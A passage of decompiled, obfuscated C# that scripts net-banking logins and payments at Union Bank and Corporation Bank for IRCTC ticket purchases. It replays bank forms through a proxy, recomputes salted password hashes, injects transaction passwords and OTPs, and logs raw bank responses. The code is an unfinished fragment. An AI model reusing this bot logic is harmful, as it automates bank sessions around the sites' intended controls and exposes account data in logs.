OTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2C%2CTranRequestManagerFG.CUST_ADDRESS%2CTranRequestManagerFG.CUST_CITY%2CTranRequestManagerFG.CUST_STATE%2CTranRequestManagerFG.CUST_ZIP%2CTranRequestManagerFG.CUST_COUNTRY%2C%2C%2CTranRequestManagerFG.BANK_IDENTIFIER%2CTranRequestManagerFG.BANK_IDENTIFIER_NETWORK%2C%2C%2C%2CTranRequestManagerFG.ON_BEHALF_OF_ID%2CTranRequestManagerFG.CUST_ADDRESS%2CTranRequestManagerFG.CUST_CITY%2CTranRequestManagerFG.CUST_STATE%2CTranRequestManagerFG.CUST_ZIP%2CTranRequestManagerFG.CUST_COUNTRY%2C%2C%2CTranRequestManagerFG.INTER_BANK%2CHREF_TranRequestManagerFG.INTMDRY_BANKNAME%2CHREF_TranRequestManagerFG.INTMDRY_BRANCHNAME%2CHREF_TranRequestManagerFG.INTMDRY_ADDR%2CHREF_TranRequestManagerFG.INTMDRY_CITY_ZIP%2CHREF_TranRequestManagerFG.INTMDRY_COUNTRY_DESC%2CHREF_TranRequestManagerFG.INTMDRY_CLEARING_CODE%2CTranRequestManagerFG.INTMDRY_COUNTRY%2CHREF_TranRequestManagerFG.INTER_BANK_CODE%2C%2C%2C%2CTranRequestManagerFG.NWK_TYP%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_M%2CTranRequestManagerFG.PAYEE_FORMAT%2CTranRequestManagerFG.IS_CONSUMER_CODE_VISIBLE%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_L%2CTranRequestManagerFG.ENTRY_AMT%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_C%2CTranRequestManagerFG.ENTRY_AMT%2C%2C%2CTranRequestManagerFG.DESTINATION_NICK_NAME_B%2CTranRequestManagerFG.ENTRY_AMT%2CTranRequestManagerFG.BENEFICIARY_REFERENCE%2C%2C%2CTranRequestManagerFG.DESTINATION_TYPE%2C%2C%2CTranRequestManagerFG.BILLER_NAME%2C%2C%2CTranRequestManagerFG.INITOR_ACCOUNT_BATCH%2C%2C%2CTranRequestManagerFG.BENEFICIARY_REFERENCE%2CTranRequestManagerFG.DELIVERY_MODE%2C%2C%2CReportCode2%2C%2C%2CReportCode2%2C%2C%2CAvailableBalance%2CAvailableBalance1%2CReportCode%2CDebitActCat%2C%2C%2CAvailableBalanceBatch%2CAvailableBalanceBatch1%2C%2C&JS_ENABLED_FLAG=Y&DECRYPT_FLAG=N&CHECKBOX_NAMES__=TranRequestManagerFG.END_DATE_UPDATE&Requestid=1&Action.CONTINUE_TXN_WITH_ADDN_DET=Continue&__GROUPLET_NAME__=PageConfigurationMaster_CIMSHPW__1&__RIA__=GROUPLET&GROUPLETS_IN_PAGE=,PageConfigurationMaster_CIMSHPW__1,PageConfigurationMaster_W49__1";
                            text4 = class3_0.Method_SerialInp(string_101, ref string_98, false);
                            text4 = clsPostData.SetPost(text4, "JS_ENABLED_FLAG", "Y");
                            text4 = clsPostData.SetPost(text4, "ReportCode", "N");
                            text4 = "TranRequestManagerFG.REC_FREQ=1&TranRequestManagerFG.INITOR_ACCOUNT=" + text18 + "&TranRequestManagerFG.TXN_CRN=INR&TranRequestManagerFG.DESTINATION_TYPE=M&" + text4.Replace("&TranRequestManagerFG.END_DATE_UPDATE=checkbox", "").Replace("&Action.REDIRECT_TO_MERCHANT=Redirect+To+merchant+site&Action.CONTINUE_TXN_WITH_ADDN_DET=Continue", "") + "&Action.CONTINUE_TXN_WITH_ADDN_DET=Continue&__GROUPLET_NAME__=PageConfigurationMaster_CIMSHPW__1&__RIA__=GROUPLET&GROUPLETS_IN_PAGE=,PageConfigurationMaster_CIMSHPW__1,PageConfigurationMaster_W49__1";
                            startIndex2 = string_91.IndexOf("riaFeatureID: \"2");
                            startIndex2 = string_91.IndexOf("baseUrl", startIndex2);
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            string_99 = text15 + string_91.Substring(startIndex2, length2);
                            string_100 = "TranRequestManagerFG.INITOR_ACCOUNT=" + text18 + "&errorForConntrolIds=Transaction%20Reference%20Name%3DTranRequestManagerFG.TXN_REF_NAME%40%40Frequency%20Type%3DTranRequestManagerFG.FREQ_TYPE%40%40Frequency%3DTranRequestManagerFG.REC_FREQ%40%40Recurring%20Date%3DTranRequestManagerFG.TXN_DATE%40%40Transaction%20Date%7C%7CLC1146%3DTranRequestManagerFG.TXN_DATE%40%40Effective%20Date%7C%7CLC12832%3DTranRequestManagerFG.TXN_DATE%40%40Next%20Installment%20Date%3DTranRequestManagerFG.TXN_DATE%40%40Number%20Of%20Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Total%20Number%20Of%20Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Pending%20Installments%3DTranRequestManagerFG.PEN_NO_INST%40%40End%20Date%3DTranRequestManagerFG.END_DATE%40%40Validity%20Indicator%3DTranRequestManagerFG.VAL_IND%40%40Marked%20for%20Stop%3DTranRequestManagerFG.MARKED_FOR_STOP_STATUS%40%40First%20Payment%20Date%3DTranRequestManagerFG.FIRST_PMT_DATE%40%40First%20Payment%20Amount%3DTranRequestManagerFG.FIRST_PMT_AMT%40%40Last%20Payment%20Amount%3DTranRequestManagerFG.LAST_PMT_AMT%40%40Originator%20ID%3DTranRequestManagerFG.ORIGINATOR_ID_COMPANY_ID%40%40Initiator%20Account%3DTranRequestManagerFG.INITOR_ACCOUNT_BATCH%40%40Originator%20Remarks%3DTranRequestManagerFG.ORIGINATOR_REMARKS%40%40Descriptive%20Date%3DTranRequestManagerFG.DESCRIPTIVE_HEADER_DATE%40%40Account%7C%7CLC2197%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Pay%20From%20Account%7C%7CLC13738%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Initiator%20Peer%20To%20Peer%20ID%3DTranRequestManagerFG.INITIATOR_PTP_DETAILS%40%40Debit%2FCredit%3DTranRequestManagerFG.CREDIT_DEBIT_FLAG%40%40Amount%3DTranRequestManagerFG.ENTRY_AMT%40%40Network%3DTranRequestManagerFG.NWK_TYP%40%40Beneficiary%20Reference%3DTranRequestManagerFG.BENEFICIARY_REFERENCE%40%40Remarks%3DTranRequestManagerFG.ENT_REMARKS%40%40Mandate%20ID%3DTranRequestManagerFG.MANDATE_ID%40%40Transaction%20Purpose%3DTranRequestManagerFG.TRAN_PURPOSE%40%40Negotiated%20Rate%3DnegotiatedRateComp%40%40Dealer%20Reference%3DTranRequestManagerFG.DEALER_REF%40%40Trace%20Account%3DTranRequestManagerFG.TRACE_ACCOUNT_ENTITY_ID%40%40On%20Behalf%20of%7C%7CLC3459%3DonBehalfOfComp%40%40Collect%20On%20Behalf%20of%7C%7CLC13742%3DonBehalfOfComp%40%40Address%3DTranRequestManagerFG.CUST_ADDRESS%40%40State%3DTranRequestManagerFG.CUST_STATE%40%40Country%3DTranRequestManagerFG.CUST_COUNTRY%40%40Remark%3DTranRequestManagerFG.ORIG_REMARKS%40%40Delivery%20Mode%3DTranRequestManagerFG.DELIVERY_MODE%40%40Counterparty%20Bank%20Clearing%20Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Counterparty%20Bank%20Clearing%20Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Network%20Product%3DTranRequestManagerFG.NWR_PRODUCT%40%40Transfer%20Information%3DTranRequestManagerFG.TRANSFER_INFO%40%40Commission%2FCharge%20Indicator%3DTranRequestManagerFG.COMMISSION_IND%40%40Intermediary%20Bank%20Search%3DbankSearchComp%40%40&target=PageConfigurationMaster_CIMSHPW__1:AvailableBalance=TranRequestManagerFG.RESULTANT_AVAILABLE_BALANCE,PageConfigurationMaster_CIMSHPW__1:AvailableBalance1=TranRequestManagerFG.INITIATOR_ACCOUNT_BAL,PageConfigurationMaster_CIMSHPW__1:ReportCode=TranRequestManagerFG.IS_REPORT_CODE,PageConfigurationMaster_CIMSHPW__1:DebitActCat=TranRequestManagerFG.DEBIT_ACT_CAT&eventType=onLoad&errorForConntrolIds=Transaction%20Reference%20Name%3DTranRequestManagerFG.TXN_REF_NAME%40%40Frequency%20Type%3DTranRequestManagerFG.FREQ_TYPE%40%40Frequency%3DTranRequestManagerFG.REC_FREQ%40%40Recurring%20Date%3DTranRequestManagerFG.TXN_DATE%40%40Transaction%20Date%7C%7CLC1146%3DTranRequestManagerFG.TXN_DATE%40%40Effective%20Date%7C%7CLC12832%3DTranRequestManagerFG.TXN_DATE%40%40Next%20Installment%20Date%3DTranRequestManagerFG.TXN_DATE%40%40Number%20Of%20Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Total%20Number%20Of%20Installments%3DTranRequestManagerFG.TOT_NO_INST%40%40Pending%20Installments%3DTranRequestManagerFG.PEN_NO_INST%40%40End%20Date%3DTranRequestManagerFG.END_DATE%40%40Validity%20Indicator%3DTranRequestManagerFG.VAL_IND%40%40Marked%20for%20Stop%3DTranRequestManagerFG.MARKED_FOR_STOP_STATUS%40%40First%20Payment%20Date%3DTranRequestManagerFG.FIRST_PMT_DATE%40%40First%20Payment%20Amount%3DTranRequestManagerFG.FIRST_PMT_AMT%40%40Last%20Payment%20Amount%3DTranRequestManagerFG.LAST_PMT_AMT%40%40Originator%20ID%3DTranRequestManagerFG.ORIGINATOR_ID_COMPANY_ID%40%40Initiator%20Account%3DTranRequestManagerFG.INITOR_ACCOUNT_BATCH%40%40Originator%20Remarks%3DTranRequestManagerFG.ORIGINATOR_REMARKS%40%40Descriptive%20Date%3DTranRequestManagerFG.DESCRIPTIVE_HEADER_DATE%40%40Account%7C%7CLC2197%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Pay%20From%20Account%7C%7CLC13738%3DTranRequestManagerFG.INITOR_ACCOUNT%40%40Initiator%20Peer%20To%20Peer%20ID%3DTranRequestManagerFG.INITIATOR_PTP_DETAILS%40%40Debit%2FCredit%3DTranRequestManagerFG.CREDIT_DEBIT_FLAG%40%40Amount%3DTranRequestManagerFG.ENTRY_AMT%40%40Network%3DTranRequestManagerFG.NWK_TYP%40%40Beneficiary%20Reference%3DTranRequestManagerFG.BENEFICIARY_REFERENCE%40%40Remarks%3DTranRequestManagerFG.ENT_REMARKS%40%40Mandate%20ID%3DTranRequestManagerFG.MANDATE_ID%40%40Transaction%20Purpose%3DTranRequestManagerFG.TRAN_PURPOSE%40%40Negotiated%20Rate%3DnegotiatedRateComp%40%40Dealer%20Reference%3DTranRequestManagerFG.DEALER_REF%40%40Trace%20Account%3DTranRequestManagerFG.TRACE_ACCOUNT_ENTITY_ID%40%40On%20Behalf%20of%7C%7CLC3459%3DonBehalfOfComp%40%40Collect%20On%20Behalf%20of%7C%7CLC13742%3DonBehalfOfComp%40%40Address%3DTranRequestManagerFG.CUST_ADDRESS%40%40State%3DTranRequestManagerFG.CUST_STATE%40%40Country%3DTranRequestManagerFG.CUST_COUNTRY%40%40Remark%3DTranRequestManagerFG.ORIG_REMARKS%40%40Delivery%20Mode%3DTranRequestManagerFG.DELIVERY_MODE%40%40Counterparty%20Bank%20Clearing%20Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Counterparty%20Bank%20Clearing%20Code%3DTranRequestManagerFG.CLEARING_CODE%40%40Network%20Product%3DTranRequestManagerFG.NWR_PRODUCT%40%40Transfer%20Information%3DTranRequestManagerFG.TRANSFER_INFO%40%40Commission%2FCharge%20Indicator%3DTranRequestManagerFG.COMMISSION_IND%40%40Intermediary%20Bank%20Search%3DbankSearchComp%40%40&requestId=1";
                            string_71 = "X-Requested-With=XMLHttpRequest&requestId=1";
                            if (!_Request(string_99, string_100, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                                string_90 = "Union NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Fourth Output htm = " + string_91);
                            string_71 = "X-Requested-With=XMLHttpRequest&requestId=1";
                            if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                                string_90 = "Union NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Fourth Output htm = " + string_91);
                            if (!string_91.Contains("Confirmation Details"))
                            {
                                string_90 = "Failed while processing payment.";
                                clsMain.Lock("Fourth Hit Failed. Check HTML");
                                return false;
                            }
                            string_101 = "<form name=\"AuthenticationFG\" method=\"post\" action=\"https://www.unionbankonline.co.in/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=026&AuthenticationFG.USER_TYPE=1&AuthenticationFG.TAX_MNU_ID=CIMSHP&AuthenticationFG.CALL_MODE=2&CATEGORY_ID=SHP&RU=https://securegw.paytm.in/instaproxy/bankresponse/UNI/NB/RESP/&QS=XXJt1sfFgH42aDbauaUS8BXcjLS%2FCVixrKVvJORhuLldcm3Wx8WAfjZoNtq5pRLwl%2FkQwMboKWlJqsK2i%2B9H3gc8vVArbcFTCdzmo8h2fcJzGkYiyxUPlOv6UC8T5ZoC%0D%0AK6S%2FHv4lAIHUoixA0F7WucYqDLhq8crHQt5kdEkZDTYHWW%2FmDVXCXYI04m%2B7jxesxe5SSSAW3BsGTk0WKJb5zJFrQgZEY0vqrwrOMYN8Ixen%2FqZ4EDkiXFbY0iAwvYk5d5QT%0D%0AKQ%2FdTByDN8UBze2FaOQj5ynBD0MlAlorcbABEyJ%2BcYI%2Fz%2B%2FVMudK%2B047PPSm\"> \n" + string_91 + "</form>";
                            startIndex2 = string_91.IndexOf("formAction");
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            string_92 = text15 + string_91.Substring(startIndex2, length2);
                            text4 = class3_0.Method_SerialInp(string_101, ref string_98, false);
                            str2 = text4.Substring(text4.IndexOf("KEY__") + 6);
                            str2 = HttpUtility.UrlDecode(str2);
                            text4 = clsPostData.SetPost(text4, "JS_ENABLED_FLAG", "Y");
                            text4 = clsPostData.SetPost(text4, "DECRYPT_FLAG", "Y");
                            text4 = clsPostData.SetPost(text4, "__JS_ENCRYPT_KEY__", "");
                            text4 = text4.Replace("Action.BACK_CONTINUE_ADDN_DETAILS=Back+to+edit&", "").Replace("pp_=&pp_=&alp_=&pp_caps=&pp_caps=&pp_erase=&pp_clear=&", "").Replace("Action.AuthenticationFG.CUSTOM_GENERATE_OTP_OWN__=Re-Generate+OTP&", "") + "&__GROUPLET_NAME__=PageConfigurationMaster_CIMSHPW__1&__RIA__=GROUPLET&GROUPLETS_IN_PAGE=,PageConfigurationMaster_CIMSHPW__1,PageConfigurationMaster_W49__1";
                            text16 = "";
                            text17 = "UNION2";
                            updateTStatus_2?.Invoke(1005, text17 + "||" + text3 + "||" + str2, "");
                            if (clsMain.dictionary_5.ContainsKey(text17))
                            {
                                object obj3 = new object();
                                object obj4 = obj3;
                                lock (obj4)
                                {
                                    text16 = clsMain.dictionary_5[text17];
                                    method_61("Encrypted Data, out = " + text16);
                                    clsMain.dictionary_5.Remove(text17);
                                }
                            }
                            text4 = clsPostData.SetPost(text4, "TranRequestManagerFG.TRANSACTION_PASSWORD__", text16);
                            text16 = "";
                            text17 = "UNION2";
                            updateTStatus_2?.Invoke(1005, text17 + "||dummy1||" + str2, "");
                            if (clsMain.dictionary_5.ContainsKey(text17))
                            {
                                object obj5 = new object();
                                object obj6 = obj5;
                                lock (obj6)
                                {
                                    text16 = clsMain.dictionary_5[text17];
                                    method_61("Encrypted Data, out = " + text16);
                                    clsMain.dictionary_5.Remove(text17);
                                }
                            }
                            text4 = clsPostData.SetPost(text4, "dummy1", text16);
                            text16 = "";
                            text17 = "UNION2";
                            updateTStatus_2?.Invoke(1005, text17 + "||dummy2||" + str2, "");
                            if (clsMain.dictionary_5.ContainsKey(text17))
                            {
                                object obj7 = new object();
                                object obj8 = obj7;
                                lock (obj8)
                                {
                                    text16 = clsMain.dictionary_5[text17];
                                    method_61("Encrypted Data, out = " + text16);
                                    clsMain.dictionary_5.Remove(text17);
                                }
                            }
                            text4 = clsPostData.SetPost(text4, "dummy2", text16);
                            text16 = "";
                            text17 = "UNION2";
                            updateTStatus_2?.Invoke(1005, text17 + "||dummy1||" + str2, "");
                            if (clsMain.dictionary_5.ContainsKey(text17))
                            {
                                object obj9 = new object();
                                object obj10 = obj9;
                                lock (obj10)
                                {
                                    text16 = clsMain.dictionary_5[text17];
                                    method_61("Encrypted Data, out = " + text16);
                                    clsMain.dictionary_5.Remove(text17);
                                }
                            }
                            text4 = text4.Replace("=dummy1", "=" + text16);
                            text16 = "";
                            text17 = "UNION2";
                            updateTStatus_2?.Invoke(1005, text17 + "||dummy2||" + str2, "");
                            if (clsMain.dictionary_5.ContainsKey(text17))
                            {
                                object obj11 = new object();
                                object obj12 = obj11;
                                lock (obj12)
                                {
                                    text16 = clsMain.dictionary_5[text17];
                                    method_61("Encrypted Data, out = " + text16);
                                    clsMain.dictionary_5.Remove(text17);
                                }
                            }
                            text4 = text4.Replace("=dummy2", "=" + text16);
                            string string_102 = "";
                            if (string.IsNullOrEmpty(string_102) && !method_163("Enter OTP Of UNION For:.", ref string_102, ref errormsg))
                            {
                                return false;
                            }
                            text16 = "";
                            text17 = "UNION3";
                            updateTStatus_2?.Invoke(1005, text17 + "||" + string_102 + "||" + str2, "");
                            if (clsMain.dictionary_5.ContainsKey(text17))
                            {
                                object obj13 = new object();
                                object obj14 = obj13;
                                lock (obj14)
                                {
                                    text16 = clsMain.dictionary_5[text17];
                                    method_61("Encrypted Data, out = " + text16);
                                    clsMain.dictionary_5.Remove(text17);
                                }
                            }
                            text4 = clsPostData.SetPost(text4, "TranRequestManagerFG.ONE_TIME_PASSWORD__", text16);
                            string_71 = "X-Requested-With=XMLHttpRequest&requestId=2";
                            if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                                string_90 = "Union NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Fourth Output htm = " + string_91);
                            if (string_91.Contains("bankresponse"))
                            {
                                clsMain.Lock("Success ProcessUnionNB ");
                                string_89 = string_91;
                                string_90 = text;
                                return true;
                            }
                            startIndex2 = string_91.IndexOf("<FORM");
                            startIndex2 = string_91.IndexOf("ACTION", startIndex2);
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            clsMain.Lock("Url=" + string_92 + "     referer=" + text);
                            if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Fifth Hit Failed. err = " + string_93);
                                string_90 = "Union NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Fifth Output htm = " + string_91);
                            if (string_91.Contains("https://www.irctc.co.in/eticketing/BankResponse"))
                            {
                                clsMain.Lock("Success ProcessUnionNB ");
                                string_89 = string_91;
                                string_90 = text;
                                return true;
                            }
                            if (!string_91.Contains("Do not click"))
                            {
                                if (!string_91.Contains("You were left with") && !string_91.Contains("Invalid Transaction Password"))
                                {
                                    if (string_91.Contains("Daily Number of Transactions Limit exceeded"))
                                    {
                                        string_90 = "Daily Number of Transactions Limit exceeded.";
                                    }
                                    else if (string_91.Contains("Insufficient funds"))
                                    {
                                        string_90 = "Insufficient funds";
                                    }
                                    else
                                    {
                                        string_90 = "Failed while processing payment.";
                                    }
                                }
                                else
                                {
                                    string_90 = "Your Txn Password may be wrong.";
                                }
                                clsMain.Lock("Fifth Hit Failed. Check HTML strerr=" + string_90);
                                return false;
                            }
                            string_91 = string_91.Substring(string_91.IndexOf("</form>") + 6);
                            text4 = class3_0.Method_SerialInp(string_91, ref string_92, false);
                            clsMain.Lock("Sixth Hit Inp = " + text4);
                            clsMain.Lock("Url=" + string_92 + "     referer=" + text);
                            bool_28 = false;
                            if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Sixth Hit Failed. err = " + string_93);
                                string_90 = "UBI NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Sixth Output htm = " + string_91);
                            startIndex2 = string_91.IndexOf("href=\"") + 6;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            string_91 = string_91.Substring(startIndex2, length2);
                            string_91 = string_91.Replace("&amp;", "&");
                            clsMain.Lock("Success ProcessUnionNB ");
                            string_89 = string_91;
                            string_90 = text;
                            return true;
                        }
                        return false;
                    }
                    clsMain.Lock("Second Hit Failed. err = " + string_93);
                    string_90 = "UBI NB Not Working - Payment Failed";
                    return false;
                }
            }
            catch (Exception ex)
            {
                clsMain.method_74("ProcessUnionNB", ex.Message);
            }
            return false;
        }

        private bool method_163(string v, ref string text23, ref object errormsg)
        {
            throw new NotImplementedException();
        }

        private bool method_138(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessCorpNB.");
            if (string_86.Contains("corpretail.com"))
            {
                string_89 = "";
                string string_91 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string string_92 = "";
                string string_93 = "";
                string text4;
                if (bool_13)
                {
                    bool_13 = false;
                    string[] array2 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                    text4 = array2[0];
                    string_92 = array2[1];
                }
                text4 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_94 = "";
                string string_95 = "";
                string string_96 = text4.Substring(text4.IndexOf("TID=") + 4, text4.IndexOf("&"));
                bool result2;
                try
                {
                    clsMain.Lock("First Hit Inp = " + text4);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. CORP_NB(1/6)", tCntrlName_, null, null);
                    }
                    if (_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                    {
                        clsMain.Lock("First Output htm = " + string_95);
                        if (!string.IsNullOrEmpty(string_95.Trim()) && string_95.Contains("Welcome to CorpNet"))
                        {
                            string_91 = string_92;
                            text4 = class3_0.Method_SerialInp(string_95, ref string_93, false);
                            string_92 = string_93;
                            clsMain.Lock("Second Hit Inp = " + text4);
                            _Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0);
                            string[] array3 = Strings.Split(class3_0.string_72, "&&");
                            int num = Information.UBound(array3);
                            for (int i = 0; i < num; i++)
                            {
                                string[] array4 = Strings.Split(array3[i], "=");
                                Cookie cookie = new Cookie(array4[0], array4[1])
                                {
                                    Domain = "www.corpretail.com"
                                };
                                cookieContainer_.Add(cookie);
                            }
                            string_92 = "https://www.corpretail.com/RetailBank/olt/olt.onlineinterface.prelogin.do";
                            text4 = class3_0.Method_SerialInp(string_95, ref string_93, false);
                            text4 = clsPostData.SetPost(text4, "groupId", "RETAIL");
                            text4 = clsPostData.SetPost(text4, "userId", HttpUtility.UrlEncode(text));
                            clsMain.Lock("Second Hit Inp = " + text4);
                            _Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0);
                            clsMain.Lock("First Output htm = " + string_95);
                            int startIndex = string_95.IndexOf("hashrand");
                            startIndex = string_95.IndexOf("\"", startIndex) + 1;
                            int length = string_95.IndexOf("\"", startIndex) - startIndex;
                            string text5 = string_95.Substring(startIndex, length);
                            byte[] bytes = Encoding.UTF8.GetBytes(text + text2);
                            if (func_2 == null)
                            {
                                func_2 = smethod_14;
                            }
                            string text6 = new MD5Cng().ComputeHash(bytes).Aggregate(new StringBuilder(), func_2).ToString();
                            bytes = Encoding.UTF8.GetBytes(text6 + text5);
                            if (func_3 == null)
                            {
                                func_3 = smethod_15;
                            }
                            string string_97 = new MD5Cng().ComputeHash(bytes).Aggregate(new StringBuilder(), func_3).ToString();
                            string_91 = string_92;
                            text4 = class3_0.Method_SerialInp(string_95, ref string_92, false);
                            string_92 = "https://www.corpretail.com/RetailBank/olt/olt.onlineinterface.online.do";
                            text4 = clsPostData.SetPost(text4, "userId", HttpUtility.UrlEncode(text));
                            text4 = clsPostData.SetPost(text4, "password", string_97);
                            text4 = clsPostData.SetPost(text4, "salt", text5);
                            clsMain.Lock("Second Hit Inp = " + text4);
                            if (_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                            {
                                clsMain.Lock("Second Output htm = " + string_95);
                                if (string.IsNullOrEmpty(string_95.Trim()) || !string_95.Contains("Branch/Account Number"))
                                {
                                    return result;
                                }
                                startIndex = string_95.IndexOf("Branch/Account number\"") + 22;
                                startIndex = string_95.IndexOf("\"", startIndex) + 1;
                                length = string_95.IndexOf("\"", startIndex) - startIndex;
                                string str = string_95.Substring(startIndex, length);
                                startIndex = string_95.IndexOf("\",\"", startIndex) + 3;
                                length = string_95.IndexOf("\"", startIndex) - startIndex;
                                string string_98 = string_95.Substring(startIndex, length);
                                startIndex = string_95.IndexOf("\",\"", startIndex) + 3;
                                length = string_95.IndexOf("\"", startIndex) - startIndex;
                                string string_99 = string_95.Substring(startIndex, length);
                                startIndex = string_95.IndexOf("\",\"", startIndex) + 3;
                                length = string_95.IndexOf("\"", startIndex) - startIndex;
                                string string_100 = string_95.Substring(startIndex, length);
                                startIndex = string_95.IndexOf("\",\"", startIndex) + 3;
                                length = string_95.IndexOf("\"", startIndex) - startIndex;
                                string string_101 = string_95.Substring(startIndex, length);
                                startIndex = string_95.IndexOf("\",\"", startIndex) + 3;
                                length = string_95.IndexOf("\"", startIndex) - startIndex;
                                string string_102 = string_95.Substring(startIndex, length);
                                string_91 = string_92;
                                text4 = class3_0.Method_SerialInp(string_95, ref string_92, false);
                                string_92 = "https://www.corpretail.com/RetailBank/olt/olt.onlineinterface.onpayments.do";
                                text4 = class3_0.Method_SerialInp(string_95, ref string_93, false);
                                text4 = "hidpwd=&" + text4.Replace("hidpwd", "cmbbranchacctno");
                                text4 = clsPostData.SetPost(text4, "brancid", string_98);
                                text4 = clsPostData.SetPost(text4, "cmbaccnumber", string_99);
                                text4 = clsPostData.SetPost(text4, "accttype", string_100);
                                text4 = clsPostData.SetPost(text4, "acctsubtype", string_101);
                                text4 = clsPostData.SetPost(text4, "acctnum", string_102);
                                text4 = clsPostData.SetPost(text4, "cmbbranchacctno", HttpUtility.UrlEncode(str));
                                text4 = clsPostData.SetPost(text4, "tid", string_96);
                                text4 = clsPostData.SetPost(text4, "transId", string_96);
                                text4 = clsPostData.SetPost(text4, "hidbranchcode", string_98);
                                text4 = clsPostData.SetPost(text4, "hidbranch", HttpUtility.UrlEncode(str));
                                text4 = clsPostData.SetPost(text4, "hidacctnum", string_102);
                                text4 = clsPostData.SetPost(text4, "txtremark", "Tkt");
                                clsMain.Lock("Third Hit Inp = " + text4);
                                if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                                {
                                    clsMain.Lock("Third Hit Failed. err = " + string_94);
                                    string_90 = "CORP NB Not Working - Payment Failed";
                                    return false;
                                }
                                clsMain.Lock("Third Output htm = " + string_95);
                                if (string_95.Contains("Authorization Password"))
                                {
                                    startIndex = string_95.IndexOf("hashrand");
                                    startIndex = string_95.IndexOf("\"", startIndex) + 1;
                                    length = string_95.IndexOf("\"", startIndex) - startIndex;
                                    text5 = string_95.Substring(startIndex, length);
                                    bytes = Encoding.UTF8.GetBytes(text + text3);
                                    if (func_2 == null)
                                    {
                                        func_2 = smethod_14;
                                    }
                                    text6 = new MD5Cng().ComputeHash(bytes).Aggregate(new StringBuilder(), func_2).ToString();
                                    bytes = Encoding.UTF8.GetBytes(text6 + text5);
                                    if (func_3 == null)
                                    {
                                        func_3 = smethod_15;
                                    }
                                    string_97 = new MD5Cng().ComputeHash(bytes).Aggregate(new StringBuilder(), func_3).ToString();
                                    startIndex = string_95.IndexOf("displayProgressLabel");
                                    string_91 = string_92;
                                    text4 = class3_0.Method_SerialInp(string_95, ref string_93, false);
                                    string_92 = "https://www.corpretail.com/RetailBank/olt/olt.onlineinterface.onconfirm.do";
                                    text4 = clsPostData.SetPost(text4, "hiduser", text);
